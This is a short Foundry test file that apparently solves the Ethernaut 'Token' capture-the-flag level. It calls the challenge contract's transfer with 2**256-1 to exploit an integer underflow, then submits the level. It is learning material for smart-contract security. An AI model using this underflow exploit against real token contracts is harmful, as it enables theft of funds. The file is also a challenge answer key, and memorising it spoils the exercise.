// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IToken {
  function transfer(address _to, uint _value) external returns (bool);
}

contract TokenTest is Test {
  address internal challengeAddress;
  IToken internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x63bE8347A617476CA461649897238A31835a32CE);
    challenge = IToken(challengeAddress);
  }

  function testExploit() public {
    challenge.transfer(msg.sender, 2**256 - 1);

    utils.submitLevelInstance(challengeAddress);
  }
}
